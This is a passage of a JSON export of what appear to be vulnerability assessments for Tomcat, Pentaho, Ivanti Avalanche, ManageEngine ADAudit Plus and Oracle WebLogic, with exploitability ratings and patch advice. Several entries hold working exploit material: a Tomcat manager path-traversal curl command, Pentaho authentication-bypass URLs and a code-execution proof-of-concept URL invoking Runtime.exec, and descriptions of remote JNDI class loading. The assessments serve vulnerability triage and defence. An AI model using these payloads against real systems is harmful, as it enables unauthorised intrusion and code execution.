          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "e35b9d5f-ec4c-443a-b0b9-11675a682b8f",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "194bc53a-c6de-454a-8205-ba7bae302033",
      "created": "2023-05-02T14:31:45.202039Z",
      "revisionDate": "2023-05-02T14:31:45.201328Z",
      "document": "Useful to access to Tomcat manager that is normally exposed only on localhost, eg.\r\n\r\n```\r\ncurl http://example.org/..\\;/manager/html --path-as-is\r\n```",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "75656b17-bab3-45ab-bb27-a40826e0b90d",
      "editorId": "938a310d-c7d8-49f7-994c-3d53126a3d00",
      "topicId": "a21c107c-d32c-4715-a423-6e79a58f9552",
      "created": "2023-05-04T14:07:38.184584Z",
      "revisionDate": "2023-05-08T19:59:59.948509Z",
      "document": "",
      "score": 0,
      "metadata": {
        "exploitability": 5
      },
      "tags": []
    },
    {
      "id": "adedc108-7634-4880-9b0e-5a1ffcd2f423",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "b2451c23-7007-4cb2-9540-03c500eb9640",
      "created": "2023-05-10T17:02:46.159566Z",
      "revisionDate": "2023-05-10T17:02:46.160415Z",
      "document": "This is an authentication bypass in Hitachi Vantara Pentaho Business Analytics Server versions before 9.4.0.1 and 9.3.0.2, including 8.3.x due to the use of access checks which are done primarily through the `applicationContext-spring-security.xml` file. Within this file are various regexes which are used to control access to various pages, however the one that stands out is this one:\r\n\r\n```\r\n334 | <sec:intercept-url pattern=\"\\A/[^\\?]*(require)(-js)?(-cfg)?.js(\\?.*)?\\Z\" access=\"Anonymous,Authenticated\" />\r\n\r\n```\r\n\r\nThis regex allows anonymous and authenticated access to any page that starts with a `/`, followed by any character other than `?`, then the word `require` followed optionally by `-js` or `-cfg`, then any character, followed by `js` and then optionally a `?` followed by any characters you like until the end of the line.\r\n\r\nSo following this we can formulate a few URLs that could bypass authentication:\r\n\r\n- `/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js`\r\n- `/pentaho/api/ldap/config/ldapTreeNodeChildren/require-cfg.js`\r\n- `/pentaho/api/ldap/config/ldapTreeNodeChildren/require-js.js`\r\n- `/pentaho/api/ldap/config/ldapTreeNodeChildren/requireBjs.js`\r\n- `/pentaho/api/ldap/config/ldapTreeNodeChildren/requireKjs.js?asdf=22&bbb=44&ccc=55`\r\n\r\nWhilst the article at https://research.aurainfosec.io/pentest/pentah0wnage/ where this was originally written up seems to suggest that only `require.js` is possible, we can see that this is not the case based on the regex above.\r\n\r\nCombining this with CVE-2022-43769 as discussed at https://attackerkb.com/topics/hy6nWcCo30/cve-2022-43769 can lead to unauthenticated RCE as the user running the Hitachi Vantara Pentaho Business Analytics Server, which will typically be a privileged user such as a local administrator or local service account, which is where the real risk comes into play.\r\n\r\nGiven this context, it is highly recommended that this vulnerability be patched as soon as possible. If this was just an authentication bypass without the ability to perform anything useful, then we'd recommend patching it as part of your normal patch cycle, but given the ability to combine this with CVE-2022-43769, and the ease of exploitation of both vulnerabilities to get RCE on the server as an unauthenticated user, patching should be done as soon as possible as its likely these bugs will be exploited in the wild soon if they have not been so already.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "7e6412a1-b968-435f-8ba0-d2ab034efe7c",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "0db14989-89c2-4f37-bef0-315c9bef4321",
      "created": "2023-05-10T17:31:47.833268Z",
      "revisionDate": "2023-05-10T17:31:47.833532Z",
      "document": "This is a pretty cool vulnerability that affects Hitachi Vantara Pentaho Business Analytics Server prior to versions 9.4.0.1 and 9.3.0.2, including 8.3.x. In a nutshell, Pentaho offers some endpoints where administrators are able to test and configure LDAP connections. As mentioned in https://research.aurainfosec.io/pentest/pentah0wnage/, this is done by creating an XML-based bean definition using a combination of a base file and user provided parameters, which are then injected into the properties file without sanitization. \r\n\r\nUnfortunately this properties file can be parsed by a variety of parsers, including the built in Thymeleaf parser if a Thymeleaf template is included. By injecting a Thymeleaf template into one of the user parameters, one can utilize the ability of Thymeleaf templates to execute methods associated with Java classes to achieve arbitrary code execution by using the statement `(java.lang.Runtime).getRuntime().exec()` to get the existing Java runtime, and then call its `exec()` method to execute arbitrary code on the host.\r\n\r\nThis can then be used to exploit the target via a URL such as the following, which will open `notepad.exe` on the target:\r\n\r\n```\r\nhttp://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/?url=%23{T(java.lang.Runtime).getRuntime().exec('notepad.exe')}&mgrDn=a&pwd=a\r\n```\r\n\r\nNote that the parameters `mgrDn` and `pwd` are set to `a` but they can be whatever you like and this will still work fine.\r\n\r\nNow with that being said, normally this vulnerability would be limited in impact as you need to be an administrator to access these pages. However this can be worked around via https://attackerkb.com/topics/JGGe0nRNNv/cve-2022-43939 aka CVE-2022-43939, which allows one to do an authentication bypass to access this page by appending `require.js` to the end of the URL. So the PoC would become this:\r\n\r\n```\r\nhttp://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{T(java.lang.Runtime).getRuntime().exec('notepad.exe')}&mgrDn=a&pwd=a\r\n```\r\n\r\nNote that this is not the only URL that works. Please refer to https://attackerkb.com/topics/JGGe0nRNNv/cve-2022-43939 for more details on the regex in use and other potential ways CVE-2022-43939 could work, as URLS such as `http://127.0.0.1:8080/pentaho/api/ldap/config/ldapTreeNodeChildren/requireAjs?url=%23{T(java.lang.Runtime).getRuntime().exec('notepad.exe')}&mgrDn=a&pwd=a` could also be used to exploit this vulnerability as an unauthenticated user.\r\n\r\nThe impact of exploiting this vulnerability is that one will get code execution as the user running Hitachi Vantara Pentaho Business Analytics Server. Typically this user is a local administrator or one of the service accounts, which tend to have a fair amount of access to the underlying system. Whilst not the same as SYSTEM, it was noticed that the service account that one gains access to on a Windows device has sufficient permissions that one could elevate their privileges to SYSTEM using Named Pipe Impersonation (Printer Spooler Variant), aka technique 5 of Metasploit's `getsystem` command as detailed at https://github.com/rapid7/metasploit-framework/blob/01204106e98aacf4eb5a0537c21d5de46a240f0b/documentation/modules/post/windows/escalate/getsystem.md?plain=1#L73C9-L81\r\n\r\nOverall this is a fairly severe vulnerability that could potentially lead to SYSTEM level compromise under the right conditions by an unauthenticated attacker. I would expect to see this being exploited in the wild soon if it is not already being exploited, so it is highly recommend to patch affected systems as soon as possible.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "9285e97b-3c12-4423-b9c5-a6c8ceecf13e",
      "editorId": "e426cc12-067c-41a8-83c0-029757da0dbf",
      "topicId": "f41b7e2f-c95b-4bb7-a6ed-2c9dbdc3cd50",
      "created": "2023-05-10T18:09:31.568803Z",
      "revisionDate": "2023-05-11T21:55:12.641848Z",
      "document": "This vulnerability is associated with the Central FileStore, which is the default location for files that are used to update the devices managed by the Ivanti Avalanche server. The ZDI [advisory](https://www.zerodayinitiative.com/advisories/ZDI-23-456/) mentions that the vulnerability is located in the FileStoreConfig app. In the patched version of the `FileStoreConfigBean.class`, there is an array of exclusion patterns that have three new patterns added to the list:\r\n\r\n![Screenshot 2023-05-10 at 11 36 33 AM](https://github.com/rapid7/metasploit-framework/assets/40177151/d33f10ae-657c-4987-bf87-d22caf24d6ca)\r\n\r\nThese three patterns follow the short MS-DOS (8.3) style naming convention on Windows. Further down, the exclusion pattern list is used to validate the configuration path for the Central FileStore, barring any paths that contain any of the exclusion patterns.\r\n\r\n```java\r\n  public void validateFileStoreUncPath(FacesContext context, UIComponent component, Object value) throws ValidatorException {\r\n        logger.trace(\"FileStoreConfigBean.validateFileStoreUncPath()\");\r\n        String uncPath = value.toString();\r\n        if (!uncPath.isEmpty()) {\r\n            String testPath = uncPath.replace(\"\\\\\", \"/\");\r\n            String defaultPath = this.m_defaultunc.replace(\"\\\\\", \"/\");\r\n            if (testPath.indexOf(\"..\") != -1) {\r\n                throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path_parent\"), (String)null));\r\n            } else if (testPath.indexOf(\"./\") == -1 && testPath.indexOf(\"/.\") == -1) {\r\n                if (testPath.endsWith(\"/\")) {\r\n                    throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path_trailer\"), (String)null));\r\n                } else {\r\n                    Iterator var7 = this.m_exclusionPatterns.iterator(); <-----------\r\n\r\n                    while(var7.hasNext()) {\r\n                        Pattern patt = (Pattern)var7.next();\r\n                        Matcher matcher = patt.matcher(testPath);\r\n                        if (matcher.find()) {\r\n                            if (!testPath.equalsIgnoreCase(defaultPath)) {\r\n                                logger.error(String.format(\"Filestore path '%s' is forbidden\", uncPath));\r\n                                throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path_forbidden\"), (String)null));\r\n                            }\r\n\r\n                            logger.debug(String.format(\"Filestore path '%s' is forbidden but tolerated because it is the default CFS path\", uncPath));\r\n                        }\r\n                    }\r\n\r\n                    boolean uncStart = uncPath.startsWith(\"\\\\\");\r\n                    boolean dosStart = uncPath.length() > 1 && uncPath.charAt(1) == ':' && Character.isLetter(uncPath.charAt(0));\r\n                    if (!uncStart && !dosStart) {\r\n                        throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path\"), (String)null));\r\n                    } else if (!this.isPathValid(uncPath)) {\r\n                        throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path_syntax\"), (String)null));\r\n                    }\r\n                }\r\n            } else {\r\n                throw new ValidatorException(new FacesMessage(FacesMessage.SEVERITY_ERROR, BundleManager.getBundleString(\"inputError\", \"file_store_unc_path_current\"), (String)null));\r\n            }\r\n        }\r\n    }\r\n\r\n```\r\n\r\nBased on the patch, the vulnerability appears to be caused by the allowance of paths using the short MS-DOS style naming convention.  The web root for Ivanti Avalanche is located in `C:\\Program Files\\Wavelink\\Avalanche\\Web\\webapps\\AvalancheWeb`. Because the `webapps` directory is in the exclusion list and is too short to have a short MS-DOS style name, an attacker can set the config path to `C:\\PROGRA~1\\Wavelink\\AVALAN~1\\Web` and expand / select the `webapps` and `AvalancheWeb` folders to upload a JSP file to the web root.\r\n\r\nThe application's `web.xml` file includes a filter for the jsp extension, which prevents the uploaded payload from getting executed:\r\n\r\n```\r\n   \t<filter>\r\n    \t<filter-name>WebShellFilter</filter-name>\r\n    \t<filter-class>com.wavelink.amc.web.servlet.WebShellFilter</filter-class>\r\n    \t <init-param>\r\n            <param-name>forbiddenextensions</param-name>\r\n            <param-value>.jsp</param-value>\r\n        </init-param>\r\n\t</filter>\r\n```\r\n\r\nDespite this, Ivanti Avalanche is built with JavaServer Faces or JSF. Leveraging this, an attacker can upload a JSP payload and request `payload_name.jsf`, which will [result](https://stackoverflow.com/questions/7914660/what-is-the-difference-between-creating-jsf-pages-with-jsp-or-xhtml-or-jsf-ex) in the default `FacesServlet` serving the JSP payload and bypassing the `forbiddenextensions` filter. Successfully exploiting this vulnerability will result in RCE as `NT AUTHORITY\\SYSTEM`.\r\n\r\nI'd rate this as a moderately valuable vulnerability. It results in elevated privileges from an easily exploitable remote vulnerability; however, the attacker would need to start with admin credentials. Getting admin privileges may or may not be easily obtainable given that there are also some auth bypasses in the software: [1](https://www.zerodayinitiative.com/advisories/ZDI-23-453/), [2](https://www.zerodayinitiative.com/advisories/ZDI-23-454/). Since the vulnerable component is the file store for pushing updates to a variety of devices, I'd still say that a patch should be prioritized.",
      "score": 2,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "42ce70ef-672b-468c-8997-658005fdee40",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "9b4addb5-b3c2-4ffe-b6b2-602d75fc6f4a",
      "created": "2023-05-10T19:12:06.383795Z",
      "revisionDate": "2023-05-10T19:12:06.381071Z",
      "document": "The GPO Watcher endpoint at `/api/agent/tabs/agentGPOWatcherData` on Zoho ManageEngine ADAudit Plus before 7006 is vulnerable to a directory traversal in the `Html_fileName` parameter of a formulated POST request. By sending this request with the `Html_fileName` containing a directory traversal to write to the `alert_scripts` directory and setting the `htmlReport` parameter to the contents of a malicious command that the attacker wishes to execute, the attacker can create a malicious alert script file on the target computer.\r\n\r\nOnce this malicious alert script is created, they can then create an alert profile that will trigger on failed logins, and set the script to be executed on failed logins to the malicious script file that was created. At this point, all the attacker needs to do is to attempt to login with invalid credentials, and the malicious script file they created will be loaded and any of the commands contained within it will be executed as the user running Zoho ManageEngine ADAudit Plus.\r\n\r\nThe one limitation of this vulnerability is that a user will need to have valid credentials to the server as a user who has the ability to create alert profiles, so this does limit the usefulness of this vulnerability somewhat. However should the attacker possess these credentials, it is pretty easy for them to exploit this vulnerability to gain access to the target server.\r\n\r\nIf you would like more details on the specifics of this vulnerability, there is a great writeup at https://www.ctfiot.com/71659.html that goes into more detail.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6a410f31-83c5-416b-92fd-986f2b9b2c61",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "a9db7b0b-1653-4b62-b693-49e7e959032e",
      "created": "2023-05-18T17:57:21.702321Z",
      "revisionDate": "2023-05-18T20:29:30.389255Z",
      "document": "Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the Jan 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability via IIOP/T3. A PoC for this vulnerability was originally posted by 4ra1n at https://github.com/4ra1n/CVE-2023-21839, and about a week or so later a writeup came out by 14m3ta7k of the company GobySec at https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md which explained the vulnerability in depth with detailed code walkthroughs and explanations.\r\n\r\nAs noted in the writeup, CVE-2023-21839 is not your typical deserialization vulnerability. Most deserialization vulnerabilities lead to code execution at the same time that deserialization of the attacker's object occurs. However for CVE-2023-21839, the vulnerability occurs not in the deserialization of the attacker's object, but rather the fact that an attacker is able to create an object in the target's memory and then later trigger another function that utilizes that deserialized object without performing proper sanity checks.\r\n\r\nAs the writeup explains, we can abuse some behavior of the `lookup()` method. When receiving a request, Weblogic will parse incoming data using `BasicServerRef`'s `invoke()` method, which will in turn call `_invoke()`, which then calls `resolve_any()` based on the passed in method name of `resolve_any`.\r\n\r\nIn `resolve_any()`, the incoming binding name is resolved using `resolveObject()`, which will then call `lookup()` based on the context information.\r\n\r\nBased on the context information, further `lookup()` calls are made in several classes such as `WLContextImpl`, `WLEventContextImpl`, `RootNamingNode`, `ServerNamingNode` and `BasicNamingNode`. All of this will eventually lead to a `resolveObject()` call in `BasicNamingNode` class.\r\n\r\nAt this point the `resolveObject()` method will realize the `obj` parameter passed into it is not an instance of the `BasicnamingNode` class and the `mode` parameter passed in will be `1` so it will call `getObjectInstance()` in `WLNamingManager`.\r\n\r\nFinally `getObjectInstance()` in `WLNamingManager` will call `getReferent()` method inside the passed in object based on the object interface type, as can be seen in the screenshot below, taken from the writeup.\r\n\r\n![Code](https://camo.githubusercontent.com/0591de91a6b77754e63268bcdde9125aa6d890c71256135cd115cf6724406676/68747470733a2f2f73332e626d702e6f76682f696d67732f323032332f30342f31382f363737623836636638623332333932302e706e67)\r\n\r\nThe bug for CVE-2023-21839 occurs specifically because the `ForeignOpaqueReference` is an instance of the `OpaqueReference` interface that the code above handles. The `ForeignOpaqueReference` class defines two constructors, and the parameterized one allows a user to specify the `env` and `remoteJNDIName` parameters, which are internally assigned to the private variables `jndiEnvironment` and `remoteJNDIName` respectively.\r\n\r\nAdditionally the class `ForeignOpaqueReference` defines a `getReferent()` method that overrides the `OpaqueReference` interface's default definition. This function will take the `remoteJNDIName` private variable of the `ForeignOpaqueReference` class and call `retVal = context.lookup(this.remoteJNDIName);`, which will perform a remote JNDI loading operation. The specific code for the `getRefent()` function can be seen below, and is taken from the writeup at https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md:\r\n\r\n```java\r\npackage weblogic.jndi.internal;\r\npublic class ForeignOpaqueReference implements OpaqueReference, Serializable {\r\n    private Hashtable jndiEnvironment;\r\n    private String remoteJNDIName;\r\n        ......\r\n    public ForeignOpaqueReference(String remoteJNDIName, Hashtable env) {\r\n        this.remoteJNDIName = remoteJNDIName;\r\n        this.jndiEnvironment = env;\r\n    }\r\n    public Object getReferent(Name name, Context ctx) throws NamingException {\r\n        InitialContext context;\r\n        if (this.jndiEnvironment == null) {\r\n            context = new InitialContext();\r\n        } else {\r\n            Hashtable properties = this.decrypt();\r\n            context = new InitialContext(properties);\r\n        }\r\n        Object retVal;\r\n        try {\r\n            retVal = context.lookup(this.remoteJNDIName);   // vulnerability point\r\n        } finally {\r\n            context.close();\r\n        }\r\n        return retVal;\r\n    }\r\n    ......\r\n}\r\n```\r\n\r\nThis implementation of `OpaqueReference`'s `getReferent()` method inside of `ForeignOpaqueReference` will be called by the `WLNamingManager` class's `getObjectInstance()` method, as mentioned previously. Specifically the `getObjectInstance()` code will see that the passed in `boundObject`, which will be a `ForeignOpaqueReference` object, is an instance of the `OpaqueReference` interface, and will call `boundObject = ((OpaqueReference)boundObject).getReferent(name, ctx);`\r\n\r\nThis will end up leading to a remote JNDI loading operation using the location specified in the `remoteJNDIName` class variable of the `ForeignOpaqueReference` object the attacker passed in. Remote JNDI loading operations are particularly dangerous since they are essentially an application reaching out to a given target, usually a remote server in the case of remote JNDI loading, and saying \"Hey, I'm interested in this particular class. Serve me up the class file for that object and I'll instantiate a local copy on my server\". The problem with this is that you can define code in Java within a `static` block in a class definition that will be run whenever the class is created. \r\n\r\nThe Metasploit module at https://github.com/rapid7/metasploit-framework/pull/17946 takes advantage of this to trigger a JNDI connection to a LDAP server we control. The LDAP server will then respond with a remote reference response that points to a HTTP server that we control, where the malicious Java class file will be hosted. Oracle Weblogic will then make a HTTP request to retrieve the malicious Java class file, at which point our HTTP server will serve up the malicious class file and Oracle Weblogic will instantiate an instance of that class, granting us RCE as the `oracle` user.\r\n\r\nOverall the risk of this vulnerability is fairly high since most of Oracle Weblogic runs as the `oracle` user, so this allows an unauthenticated attacker who has access to IIOP/T3 ports on a given target to gain full control over the server. It can be mitigated to some extent by not exposing IIOP/T3 ports to the public, however the risk will still remain that those on the internal network might be able to abuse this vulnerability to gain access to the server. Whilst public exploit code is available that makes exploitation easier, there are a number of details about this vulnerability that would take an attacker some time to reverse engineer.\r\n\r\nAdditionally, here are some other limitations that are important to take into account:\r\n- JDK 8u121 introduces the \"trustURLCodebase\" property which makes it so that we cannot load remote classes via RMI, and later this was expanded to also apply to LDAP connections such as the ones used in this vulnerability. The only way to get around this now is to take advantage of gadget chains within the application itself and essentially do a deserialization attack using gadgets from existing Java class files available in the class path.\r\n- For some reason in my tests the Java class name had to be exactly 11 characters long, otherwise things started to get wonky and would fail.\r\n- When sending the URL to visit as part of the LDAP response to the JDNI request, you have to redirect to the root, aka `/`, of a target web server. Requesting a page or a subdirectory won't work. Anchor tags after the `/` are fine though.\r\n- You must compile the target class to send with Java 8 SDK. Compiling it with a later JDK will result in a class that uses a bytecode version later than 52.0, which may not be able to be loaded by the target depending on which Java version they have installed.\r\n\r\nA final point which is of important note is that this is quite similar to CVE-2023-21931, the only difference is that CVE-2023-21931 targets the `getObjectInstance()` method of the `WLNamingManager` class using an object that is an instance of the `LinkRef` interface instead of the `OpaqueReference` interface, and uses different internal methods to perform the remote JNDI load.",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "791283de-d643-4ede-850e-91a6edb897db",
          "name": "Exploited in the wild",
          "type": "exploited_in_the_wild",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b83a3fdd-b613-4c73-b8f5-58e9e517daca",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "d6afa114-c94a-4fd4-8d66-2bdc03f4ed0e",
      "created": "2023-05-18T18:49:13.489219Z",
      "revisionDate": "2023-05-18T18:49:13.485601Z",
      "document": "Oracle Weblogic 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0 prior to the April 2023 security update are vulnerable to an unauthenticated remote code execution vulnerability due to a post deserialization vulnerability via IIOP/T3. The bug has been described in detail in a writeup by 14m3ta7k of the company GobySec at https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md, though as of the time of writing no PoC is available.\r\n\r\nThe bug is fairly similar to CVE-2023-21839 so if you haven't read that assessment over at https://attackerkb.com/assessments/6a410f31-83c5-416b-92fd-986f2b9b2c61, I'd recommend reading that one first and then coming back here.\r\n\r\nWhen receiving a request, Weblogic will parse incoming data using `BasicServerRef`'s `invoke()` method, which will in turn call `_invoke()`, which then calls `resolve_any()` based on the passed in method name of `resolve_any`.\r\n\r\nIn `resolve_any()`, the incoming binding name is resolved using `resolveObject()`, which will then call `lookup()` based on the context information.\r\n\r\nBased on the context information, further `lookup()` calls are made in several classes such as `WLContextImpl`, `WLEventContextImpl`, `RootNamingNode`, `ServerNamingNode` and `BasicNamingNode`. All of this will eventually lead to a `resolveObject()` call in `BasicNamingNode` class.\r\n\r\nAt this point the `resolveObject()` method will realize the `obj` parameter passed into it is not an instance of the `BasicnamingNode` class and the `mode` parameter passed in will be `1` so it will call `getObjectInstance()` in `WLNamingManager`.\r\n\r\nFinally `getObjectInstance()` in `WLNamingManager` will call `getReferent()` method inside the passed in object based on the object interface type, as can be seen in the screenshot below, taken from the writeup.\r\n\r\n![Code](https://camo.githubusercontent.com/0591de91a6b77754e63268bcdde9125aa6d890c71256135cd115cf6724406676/68747470733a2f2f73332e626d702e6f76682f696d67732f323032332f30342f31382f363737623836636638623332333932302e706e67)\r\n\r\nFor CVE-2023-21931 we specifically are interested in the `LinkRef` interface type, instead of the `OpaqueReference` interface that is used by CVE-2023-21839. In particular the following code will be called when `WLNamingManager`'s `getObjectInstance()` method finds an object that is an implementation of the `LinkRef` interface. Code was taken from the writeup at https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md.\r\n\r\n```java\r\npackage weblogic.jndi.internal;\r\npublic final class WLNamingManager {\r\n    public static Object getObjectInstance(Object boundObject, Name name, Context ctx, Hashtable env) throws NamingException {\r\n        if (boundObject instanceof ClassTypeOpaqueReference) {\r\n\t\t\t\t\t\t......\r\n        } else if (boundObject instanceof LinkRef) {\r\n            String linkName = ((LinkRef)boundObject).getLinkName();\r\n            InitialContext ic = null;\r\n            try {\r\n                ic = new InitialContext(env);\r\n                boundObject = ic.lookup(linkName);  // vulnerability trigger point\r\n            } catch (NamingException var15) {\r\n              ......\r\n            } finally {......}\r\n        }\r\n    }\r\n}\r\n```\r\n\r\nBasically if an object is passed in as the `boundObject` variable that is an instance of the `LinkRef` interface, then `String linkName = ((LinkRef)boundObject).getLinkName();` is called to get the link name, before it is later passed on to a lookup call with the line `boundObject = ic.lookup(linkName)` where the remote JNDI loading occurs.\r\n\r\nWhat is important to note is that the `LinkRef` interface contains a constructor that allows one to set the `linkAddrType` variable that the `getLinkName()` function will return, so the input string, aka `linkName`, in the remote JNDI loading operation `boundObject = ic.lookup(linkName)`, is entirely attacker controlled.\r\n\r\nFor reference here is what the constructor for a LinkRef class looks like, taken from https://github.com/gobysec/Weblogic/blob/main/WebLogic_CVE-2023-21931_en_US.md\r\n\r\n```\r\npackage javax.naming;\r\npublic class LinkRef extends Reference {\r\n    static final String linkClassName = LinkRef.class.getName();\r\n    static final String linkAddrType = \"LinkAddress\";\r\n\r\n    public LinkRef(Name linkName) {\r\n        super(linkClassName, new StringRefAddr(linkAddrType, linkName.toString()));\r\n    }\r\n\r\n    public LinkRef(String linkName) {\r\n        super(linkClassName, new StringRefAddr(linkAddrType, linkName));\r\n    }\r\n\r\n    public String getLinkName() throws NamingException {\r\n        if (className != null && className.equals(linkClassName)) {\r\n            RefAddr addr = get(linkAddrType);\r\n            if (addr != null && addr instanceof StringRefAddr) {\r\n                return (String)((StringRefAddr)addr).getContent();\r\n            }\r\n        }\r\n        throw new MalformedLinkException();\r\n    }\r\n}\r\n```\r\n\r\nThe code shows that its possible to instantiate a new LinkRef class with a `linkName` string and that `getLinkName()` will return the contents of `addr`, aka the `linkName` that was passed in.\r\n\r\nWhilst there is presently no in the wild exploitation of this vulnerability, given CVE-2023-21839 is almost identical to this vulnerability and is being exploited in the wild, I'd imagine that this vulnerability will likely also be exploited in the wild shortly, particularly given that this vulnerability was only recently patched in April 2023, whereas CVE-2023-21839 was patched back in January 2023.",
      "score": 1,
      "metadata": {
        "mitre-tactics": "Initial Access",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
